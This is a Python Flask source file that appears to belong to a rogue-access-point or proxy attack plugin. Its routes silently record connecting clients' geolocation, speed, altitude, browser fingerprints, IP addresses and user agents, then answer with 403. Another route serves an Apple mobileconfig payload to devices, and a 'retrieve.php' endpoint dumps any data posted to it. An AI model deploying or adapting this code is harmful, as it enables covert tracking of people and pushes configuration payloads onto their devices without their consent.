#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import logging
import datetime

from flask import Flask, request, Response, abort, redirect, url_for
from plugins.modshttp.payloads import mobileconfig_plist
from sqlalchemy import *
from includes.fonts import *

proxyapp = Flask(__name__)

@proxyapp.route('/geolocation', methods=['POST'])
def geolocation():
    if request.form['position']:
        #db = proxyapp.config['DB']
        #meta = MetaData(bind=proxyapp.config['DB'])
        #table = Table('web_locations', meta, autoload=True, autoload_with=proxyapp.config['DB'])
        pos = json.loads(request.form['position'])
        proxyapp.config['DATA_LOCATIONS'].append({
            'client_ip' : request.remote_addr,
            'timestamp' : datetime.datetime.fromtimestamp(int(pos['timestamp']) / 1000),
            'useragent' : request.headers.get('User-Agent'),
            'lat'       : float(pos['coords']['latitude']),
            'lon'       : float(pos['coords']['longitude']),
            'speed'     : float(pos['coords']['speed']) if pos['coords']['speed'] is not None else None,
            'alt'       : float(pos['coords']['altitude']) if pos['coords']['altitude'] is not None else None
        })
        logging.info("Plugin %s%s%s has collected geolocation data from %s%s%s" % (GR,proxyapp.config['PLUGIN_NAME'],G,GR,request.remote_addr,G))
        abort(403)

@proxyapp.route('/fingerprint', methods=['POST'])
def fingerprint():
    if request.form['fingerprint']:
        fp = json.loads(request.form['fingerprint'])
        proxyapp.config['DATA_FINGERPRINTS'].append({
            'client_ip'   : request.remote_addr,
            'timestamp'   : datetime.datetime.now(),
            'useragent'   : request.headers.get('User-Agent'),
            'fingerprint' : int(request.form['fingerprint'])
        })
        logging.info("Plugin %s%s%s has collected fingerprint data from %s%s%s" % (GR,proxyapp.config['PLUGIN_NAME'],G,GR,request.remote_addr,G))
        abort(403)

@proxyapp.route('/mobileconfig')
def mobileconfig():
    return Response(mobileconfig_plist, mimetype='application/x-apple-aspen-config')

@proxyapp.route('/retrieve.php')
def retrieve():
    print 'Woo Hoo'
    print request.get_data()
    return redirect(url_for('dummy'))

@proxyapp.route('/dummy')
def dummy():
    return 'dummy'
